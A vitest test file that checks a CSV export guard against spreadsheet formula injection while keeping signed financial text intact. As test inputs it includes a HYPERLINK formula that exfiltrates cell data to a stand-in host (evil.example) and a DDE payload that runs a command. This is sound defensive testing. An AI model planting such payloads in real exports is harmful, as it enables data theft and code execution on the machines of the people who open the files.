import { describe, expect, it } from "vitest";
import { neutraliseFormula, toCsv } from "./export";

/**
 * CSV FORMULA INJECTION — Task 11.9.
 *
 * `escapeCell` handled CSV *quoting* and did nothing about *execution*. Excel,
 * LibreOffice and Google Sheets treat a cell beginning `=`, `+`, `-` or `@` as
 * a formula, and quoting does not disarm it — the CSV parser consumes the
 * quotes and the formula is what reaches the cell.
 *
 * Every export in this application is built from user-supplied text: customer
 * names, bank-order remarks, ledger narrations, party names. So the payload is
 * not hypothetical — anyone who can create a customer can name them one.
 */

describe("a formula-triggering cell is neutralised", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])("1. a leading %j is prefixed", (ch) => {
    expect(neutraliseFormula(`${ch}1+1`)).toBe(`'${ch}1+1`);
  });

  it("2. THE PAYLOAD: an exfiltrating HYPERLINK is disarmed", () => {
    const attack = '=HYPERLINK("https://evil.example?d="&A1&A2,"Click me")';
    const csv = toCsv([{ Name: attack }]);

    // The text survives — but not as a formula.
    expect(csv).toContain("Click me");
    expect(csv).not.toMatch(/(^|,|")=HYPERLINK/);
  });

  it("3. the DDE payload is disarmed", () => {
    const csv = toCsv([{ Narration: "=cmd|'/c calc'!A0" }]);
    expect(csv).not.toMatch(/(^|,|")=cmd/);
  });

  it("4. quoting and disarming compose — the prefix is INSIDE the quoted field", () => {
    // If the apostrophe were added after quoting, the parser would strip it
    // back off and the formula would survive.
    const csv = toCsv([{ Name: '=SUM(A1:A9),"x"' }]);
    expect(csv).toContain("\"'=SUM");
  });
});

describe("it is lossless — the guard must not corrupt financial text", () => {
  it("5. a negative-looking narration keeps its sign", () => {
    /*
     * Stripping the character would turn "-500 adjustment" into
     * "500 adjustment". An accountant reconciling against that has been handed
     * a falsified figure — worse than the injection.
     */
    const csv = toCsv([{ Narration: "-500 adjustment" }]);
    expect(csv).toContain("-500 adjustment");
  });

  it("6. ordinary text is untouched", () => {
    const csv = toCsv([{ Name: "Priya Raman", City: "Hyderabad" }]);
    expect(csv).toBe("Name,City\nPriya Raman,Hyderabad");
  });

  it("7. a number is untouched", () => {
    expect(neutraliseFormula("1234.56")).toBe("1234.56");
  });

  it("8. a trigger character NOT at the start is untouched", () => {
    expect(neutraliseFormula("Rate 5%=high")).toBe("Rate 5%=high");
  });
});

describe("headers are covered too", () => {
  it("9. a hostile value in any column is disarmed, not just the first", () => {
    const csv = toCsv([{ A: "safe", B: "=1+1", C: "safe" }]);
    expect(csv).toContain("'=1+1");
  });
});
